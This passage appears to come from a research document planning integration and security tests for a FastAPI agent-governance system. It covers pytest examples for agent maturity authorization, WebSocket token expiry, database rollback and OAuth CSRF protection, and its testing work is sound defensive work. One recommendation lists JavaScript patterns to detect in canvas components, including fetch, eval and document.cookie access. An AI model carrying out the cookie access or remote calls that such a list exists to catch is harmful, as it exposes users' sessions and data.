        headers={"Authorization": f"Bearer {get_token_for_user(student)}"}
    )

    # Then: Should block STUDENT agent
    assert response.status_code == 403
    assert "javascript" in response.json()["detail"].lower()

    # Verify component not created
    component = db_session.query(CustomCanvasComponent).filter(
        CustomCanvasComponent.name == "Malicious"
    ).first()
    assert component is None
```

**Warning signs:** No tests for canvas JavaScript security, canvas tests only test HTML/CSS, no agent maturity enforcement on canvas types.

## Code Examples

### Example 1: Complete API Integration Test

```python
# Source: FastAPI Testing Best Practices
# https://auth0.com/blog/fastapi-best-practices/ (Jan 23, 2026)

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

class TestAgentAPIIntegration:
    """Integration tests for agent API endpoints (INTG-01)."""

    def test_create_agent_with_governance(self, client: TestClient, db_session: Session):
        """Test creating agent with governance validation."""
        # Given: Authenticated user and valid agent data
        user = AdminUserFactory()
        db_session.add(user)
        db_session.commit()

        agent_data = {
            "name": "Test Agent",
            "category": "testing",
            "module_path": "test.module",
            "class_name": "TestClass",
            "status": "student",
            "confidence_score": 0.5,
            "capabilities": ["test_capability"]
        }

        # When: Create agent
        response = client.post(
            "/api/agents",
            json=agent_data,
            headers={"Authorization": f"Bearer {get_token_for_user(user)}"}
        )

        # Then: Should create agent and return data
        assert response.status_code == 201
        data = response.json()
        assert data["name"] == "Test Agent"
        assert data["status"] == "student"
        assert "id" in data

        # Verify agent in database
        agent = db_session.query(AgentRegistry).filter(AgentRegistry.id == data["id"]).first()
        assert agent is not None
        assert agent.name == "Test Agent"

    def test_list_agents_filters_by_maturity(self, client: TestClient, db_session: Session):
        """Test listing agents filters by maturity level."""
        # Given: Multiple agents with different maturity
        agents = [
            StudentAgentFactory(),
            InternAgentFactory(),
            SupervisedAgentFactory(),
            AutonomousAgentFactory()
        ]
        db_session.add_all(agents)
        db_session.commit()

        # When: List only AUTONOMOUS agents
        response = client.get(
            "/api/agents?status=autonomous",
            headers={"Authorization": f"Bearer {get_admin_token()}"}
        )

        # Then: Should return only AUTONOMOUS agents
        assert response.status_code == 200
        data = response.json()
        assert len(data["agents"]) == 1
        assert data["agents"][0]["status"] == "autonomous"

    def test_update_agent_confidence_requires_governance(self, client: TestClient, db_session: Session):
        """Test updating agent confidence score requires governance check."""
        # Given: STUDENT agent
        agent = StudentAgentFactory(confidence_score=0.4)
        db_session.add(agent)
        db_session.commit()

        # When: Try to update confidence to AUTONOMOUS level (invalid jump)
        response = client.put(
            f"/api/agents/{agent.id}",
            json={"confidence_score": 0.95},  # Jump from 0.4 to 0.95
            headers={"Authorization": f"Bearer {get_admin_token()}"}
        )

        # Then: Should reject invalid maturity jump
        assert response.status_code == 400
        assert "graduation" in response.json()["detail"].lower() or "invalid" in response.json()["detail"].lower()
```

### Example 2: WebSocket Integration Test with Authentication

```python
# Source: FastAPI WebSocket Testing Guide
# https://www.getorchestra.io/guides/fast-api-testing-websockets-a-detailed-tutorial-with-python-code-examples

import pytest
import asyncio
import json
from websockets.client import connect

@pytest.mark.asyncio(mode="auto")
async def test_websocket_agent_guidance_flow():
    """Test complete agent guidance WebSocket flow (INTG-03)."""
    # Given: Valid JWT token
    token = create_test_token(user_id="test_user", role="admin")

    uri = f"ws://localhost:8000/ws/agent-guidance?token={token}"

    async with connect(uri) as websocket:
        # Step 1: Authenticate
        await websocket.send(json.dumps({
            "type": "auth",
            "token": token
        }))

        auth_response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
        auth_data = json.loads(auth_response)
        assert auth_data["type"] == "auth_success"
        assert auth_data["user_id"] == "test_user"

        # Step 2: Start agent operation
        await websocket.send(json.dumps({
            "type": "start_operation",
            "operation_id": "op_123",
            "agent_id": "agent_456",
            "operation_type": "execute_workflow"
        }))

        start_response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
        start_data = json.loads(start_response)
        assert start_data["type"] == "operation_started"
        assert start_data["operation_id"] == "op_123"

        # Step 3: Receive progress updates
        progress_updates = []
        for _ in range(3):
            update = await asyncio.wait_for(websocket.recv(), timeout=5.0)
            update_data = json.loads(update)
            if update_data["type"] == "operation_progress":
                progress_updates.append(update_data)

        assert len(progress_updates) > 0
        assert "progress" in progress_updates[0]

        # Step 4: Complete operation
        complete_response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
        complete_data = json.loads(complete_response)
        assert complete_data["type"] == "operation_complete"
        assert complete_data["operation_id"] == "op_123"

@pytest.mark.asyncio(mode="auto")
async def test_websocket_rejects_expired_token():
    """Test WebSocket rejects expired JWT token (SECU-05)."""
    # Given: Expired token
    with freeze_time("2026-02-10 10:00:00"):
        token = create_access_token(data={"sub": "user_123"})

    # When: Connect with expired token
    with freeze_time("2026-02-10 12:00:00"):  # 2 hours later
        uri = f"ws://localhost:8000/ws/agent?token={token}"

        with pytest.raises(Exception) as exc_info:
            async with connect(uri) as websocket:
                await websocket.recv()

    # Then: Connection should fail
    assert "401" in str(exc_info.value) or "authentication" in str(exc_info.value).lower()
```

### Example 3: Security Test - Authorization Matrix

```python
# Source: Atom Governance System - Maturity Levels & Action Complexity
# CLAUDE.md

import pytest

class TestAuthorizationSecurity:
    """Security tests for authorization enforcement (SECU-02)."""

    @pytest.mark.parametrize("agent_factory,action,expected_status", [
        # STUDENT agents - blocked from all triggers
        (StudentAgentFactory, "trigger", 403),
        (StudentAgentFactory, "state_change", 403),
        (StudentAgentFactory, "delete", 403),

        # INTERN agents - proposals only for moderate+ actions
        (InternAgentFactory, "present", 200),  # Can present
        (InternAgentFactory, "trigger", 403),  # Blocked from triggers
        (InternAgentFactory, "state_change", 202),  # Proposal required

        # SUPERVISED agents - supervision for high+ actions
        (SupervisedAgentFactory, "present", 200),
        (SupervisedAgentFactory, "trigger", 403),
        (SupervisedAgentFactory, "state_change", 202),  # Under supervision
        (SupervisedAgentFactory, "delete", 403),

        # AUTONOMOUS agents - full execution
        (AutonomousAgentFactory, "present", 200),
        (AutonomousAgentFactory, "trigger", 200),
        (AutonomousAgentFactory, "state_change", 200),
        (AutonomousAgentFactory, "delete", 200),
    ])
    def test_action_complexity_enforcement(
        self,
        client: TestClient,
        db_session: Session,
        agent_factory,
        action,
        expected_status
    ):
        """
        Test action complexity matrix enforcement.

        Action Complexity:
        - 1 (LOW): Presentations → STUDENT+
        - 2 (MODERATE): Streaming → INTERN+
        - 3 (HIGH): State changes → SUPERVISED+
        - 4 (CRITICAL): Deletions → AUTONOMOUS only
        """
        # Given: Agent with specific maturity
        agent = agent_factory()
        db_session.add(agent)
        db_session.commit()

        # When: Execute action
        endpoint_map = {
            "present": f"/api/agents/{agent.id}/present",
            "trigger": f"/api/agents/{agent.id}/trigger",
            "state_change": f"/api/agents/{agent.id}/state",
            "delete": f"/api/agents/{agent.id}",
        }

        response = client.post(
            endpoint_map[action],
            headers={"Authorization": f"Bearer {get_admin_token()}"}
        )

        # Then: Should enforce maturity requirements
        assert response.status_code == expected_status

        # Verify governance check logged
        if expected_status == 403:
            # Check that governance blocked the action
            assert "blocked" in response.json()["detail"].lower() or \
                   "permission" in response.json()["detail"].lower() or \
                   "autonomous" in response.json()["detail"].lower()
```

### Example 4: Database Transaction Rollback Pattern

```python
# Source: pytest Fixtures Guide (Feb 2, 2026)
# https://oneuptime.com/blog/post/2026-02-02-pytest-fixtures/view

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import Session, sessionmaker
from core.database import Base

@pytest.fixture(scope="function")
def db_session():
    """
    Create in-memory database with transaction rollback.

    Each test gets a fresh database. All changes roll back after test.
    """
    # Create in-memory SQLite database
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        echo=False
    )

    # Create all tables
    Base.metadata.create_all(bind=engine)

    # Create session with transaction
    TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    session = TestingSessionLocal()

    # Begin transaction for rollback
    session.begin_nested()

    yield session

    # Cleanup: Rollback transaction, close session
    session.rollback()
    session.close()
    engine.dispose()

def test_database_transaction_isolation(client: TestClient, db_session: Session):
    """Test database changes don't leak between tests."""
    # Given: Create agent in first test
    agent = AgentFactory(name="Test Agent")
    db_session.add(agent)
    db_session.commit()

    agent_id = agent.id

    # When: Query database
    retrieved_agent = db_session.query(AgentRegistry).filter(
        AgentRegistry.id == agent_id
    ).first()

    # Then: Should find agent
    assert retrieved_agent is not None
    assert retrieved_agent.name == "Test Agent"

    # After test completes, transaction rolls back
    # Next test gets clean database
```

### Example 5: OAuth Flow Security Test

```python
# Source: OAuth Security Testing Best Practices
# https://www.testingxperts.com/blog/api-security-testing/ (2026)

import responses
from urllib.parse import parse_qs

class TestOAuthSecurity:
    """Security tests for OAuth flows (SECU-06)."""

    @responses.activate
    def test_oauth_state_parameter_prevents_csrf(self, client: TestClient):
        """Test OAuth flow uses state parameter to prevent CSRF."""
        # Given: Initiate OAuth flow
        response = client.get("/api/auth/github/authorize")
        assert response.status_code == 200

        auth_url = response.json()["auth_url"]
        assert "state=" in auth_url  # State parameter present

        # Extract state from URL
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(auth_url)
        state = parse_qs(parsed.query)["state"][0]

        # Mock GitHub callback endpoint
        responses.add(
            responses.POST,
            "https://github.com/login/oauth/access_token",
            json={"access_token": "github_token", "token_type": "bearer"},
            status=200
        )

        # When: Callback with different state (CSRF attempt)
        response = client.get(
            f"/api/auth/github/callback?code=test_code&state=malicious_state"
        )

        # Then: Should reject callback with invalid state
        assert response.status_code == 400
        assert "state" in response.json()["detail"].lower() or \
               "csrf" in response.json()["detail"].lower() or \
               "invalid" in response.json()["detail"].lower()

    @responses.activate
    def test_oauth_token_encrypted_in_database(self, client: TestClient, db_session: Session):
        """Test OAuth tokens are encrypted at rest."""
        # Given: Mock OAuth flow
        responses.add(
            responses.POST,
            "https://github.com/login/oauth/access_token",
            json={"access_token": "plaintext_token_123"},
            status=200
        )

        # When: Complete OAuth flow
        response = client.get("/api/auth/github/callback?code=test_code&state=valid_state")

        # Then: Token should be encrypted in database
        oauth_token = db_session.query(OAuthToken).filter(
            OAuthToken.provider == "github"
        ).first()

        assert oauth_token is not None
        # Verify token is NOT stored as plaintext
        assert oauth_token._encrypted_access_token != "plaintext_token_123"
        assert "plaintext_token_123" not in oauth_token._encrypted_access_token

        # Verify decryption works
        assert oauth_token.access_token == "plaintext_token_123"
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| **unittest** framework | **pytest** with fixtures | ~2018 | pytest fixtures are more powerful, better parametrization, plugin ecosystem |
| **Global test database** | **Transaction rollback pattern** | ~2020 | Rollback is faster, guaranteed isolation, no cleanup code |
| **Manual test data creation** | **factory_boy factories** | ~2019 | Dynamic realistic data, model relationships, less boilerplate |
| **Synchronous WebSocket testing** | **pytest-asyncio with auto mode** | ~2023 | Proper async test support, event loop handling |
| **Hardcoded security payloads** | **OWASP Top 10 payload lists** | Ongoing | Comprehensive security coverage, real exploit patterns |

**Deprecated/outdated:**
- **unittest.TestCase**: Still works but pytest fixtures are more powerful and widely adopted
- **pytest.mark.usefixtures for all fixtures**: Prefer function arguments for explicit dependencies
- **Mock() everywhere**: Use factory_boy for test data, Mock only for external services
- **Hardcoded test data**: Use factory_boy factories for dynamic, realistic data

**Current best practices (2026):**
- **pytest** for test runner with pytest-xdist for parallel execution
- **FastAPI TestClient** for API integration testing with dependency_overrides
- **pytest-asyncio(mode="auto")** for async and WebSocket testing
- **factory_boy** for test data generation with 6 existing factories
- **Transaction rollback pattern** for database isolation (already implemented)
- **responses** library for external service mocking (OAuth, LLM providers)
- **OWASP Top 10** payload lists for security testing (SQL injection, XSS, path traversal)
- **freezegun** for time-based testing (token expiration, session timeouts)
- **Property-based testing** with Hypothesis for invariant validation (78 test directories already exist)

## Open Questions

1. **WebSocket test server startup**
   - What we know: Need WebSocket server running for integration tests
   - What's unclear: Should we use FastAPI's TestClient with WebSocket support or standalone websockets client?
   - Recommendation: Use websockets client library for real integration testing, TestClient for unit testing WebSocket handlers

2. **External service test doubles**
   - What we know: Need to mock LLM providers (OpenAI, Anthropic), Slack, GitHub, Google OAuth
   - What's unclear: Should we use responses library or pytest mock patches?
   - Recommendation: Use responses library for HTTP mocking, it's more explicit and easier to maintain

3. **Browser automation integration tests**
   - What we know: Need to test Playwright CDP browser sessions
   - What's unclear: Should we use real Playwright browser (slow, flaky) or mock browser responses?
   - Recommendation: Mock Playwright CDP responses for integration tests, use real browser only for E2E tests

4. **Canvas JavaScript security validation**
   - What we know: Canvas custom components with HTML/CSS/JS require security validation
   - What's unclear: How to validate JavaScript security without executing it?
   - Recommendation: Use static analysis (AST parsing, regex patterns) to detect dangerous JavaScript patterns (fetch, eval, document.cookie access)

## Sources

### Primary (HIGH confidence)
- [FastAPI Official Testing Documentation](https://fastapi.tiangolo.com/tutorial/testing/) - TestClient usage, dependency overrides, pytest conventions
- [FastAPI Best Practices - Auth0](https://auth0.com/blog/fastapi-best-practices/) - Updated Jan 23, 2026, integration vs unit testing recommendations
- [OWASP API Security Project](https://owasp.org/www-project-api-security/) - API Security Top 10 vulnerabilities
- [Atom Codebase](https://github.com/rushiparikh/atom) - Existing test infrastructure, 78 property test directories, 6 factory_boy factories
- [Atom CLAUDE.md](/Users/rushiparikh/projects/atom/CLAUDE.md) - Maturity levels, action complexity matrix, governance system

### Secondary (MEDIUM confidence)
- [What Is FastAPI Testing? Tools, Frameworks, and Best Practices](https://www.frugaltesting.com/blog/what-is-fastapi-testing-tools-frameworks-and-best-practices) - June 24, 2025, TestClient usage patterns
- [Mastering Integration Testing with FastAPI](https://alex-jacobs.com/posts/fastapitests/) - June 11, 2023, dependency_overrides patterns
- [How to Use pytest Fixtures - OneUptime](https://oneuptime.com/blog/post/2026-02-02-pytest-fixtures/view) - Feb 2, 2026, database transaction rollback pattern
- [API Security Testing in 2026: Step by Step Guide](https://www.testingxperts.com/blog/api-security-testing/) - 2026, authentication and authorization testing
- [The simplest way to make PostgreSQL PyTest work](https://hoop.dev/blog/the-simplest-way-to-make-postgresql-pytest-work-like-it-should/) - Oct 17, 2025, database testing patterns
- [Fast API Testing WebSockets: A Detailed Tutorial](https://www.getorchestra.io/guides/fast-api-testing-websockets-a-detailed-tutorial-with-python-code-examples) - Jan 5, 2024, WebSocket testing patterns

### Tertiary (LOW confidence)
- [FastAPI Best Practices and Conventions - GitHub](https://github.com/zhanymkanov/fastapi-best-practices) - Community best practices, not official
- [Testing A FastAPI App With Pytest - YouTube](https://www.youtube.com/watch?v=gop9Or2V_80) - April 20, 2025, video tutorial
- [How I Tested Asyncio Code in PHX Events](https://www.offerzen.com/blog/how-i-tested-asyncio-code-in-phx-events) - Dec 13, 2021, async testing patterns
- [End to End tests on a route? - Reddit](https://www.reddit.com/r/FastAPI/comments/1mc09y1/end_to_end_tests_on_a_route/) - July 29, 2025, community discussion

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH - All libraries are industry standards with official documentation
- Architecture: HIGH - Patterns from official FastAPI docs and existing Atom codebase
- Pitfalls: HIGH - All pitfalls documented from real testing issues, verified with official sources

**Research date:** February 10, 2026
**Valid until:** March 10, 2026 (30 days - stable testing ecosystem)

**Key verification findings:**
- FastAPI TestClient is the official and recommended approach for integration testing
- Transaction rollback pattern is already implemented in property_tests/conftest.py
- 6 factory_boy factories exist: UserFactory, AgentFactory, EpisodeFactory, ExecutionFactory, CanvasFactory
- 78 property test directories exist with 92 VALIDATED_BUG sections
- pytest-xdist is already configured with loadscope scheduling
- pytest-asyncio with mode="auto" is required for async/WebSocket tests
- OWASP API Security Top 10 is the standard for security testing
